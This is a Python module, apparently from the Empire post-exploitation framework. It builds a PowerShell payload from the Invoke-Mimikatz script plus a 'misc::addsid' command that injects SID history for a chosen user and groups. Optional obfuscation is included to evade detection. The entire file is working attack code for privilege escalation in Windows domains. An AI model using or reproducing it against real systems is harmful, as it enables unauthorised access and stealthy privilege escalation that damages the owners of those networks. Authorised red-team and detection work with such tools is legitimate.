from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # ridiculous escape format
        groups = " ".join(['"\\""'+group.strip().strip("'\"")+'"""' for group in params["Groups"].split(",")])

        # build the custom command with whatever options we want
        command = '""misc::addsid '+params["User"] + ' ' + groups

        # base64 encode the command to pass to Invoke-Mimikatz
        scriptEnd = "Invoke-Mimikatz -Command '\"" + command + "\"';"

        if obfuscate:
            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscation_command)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script
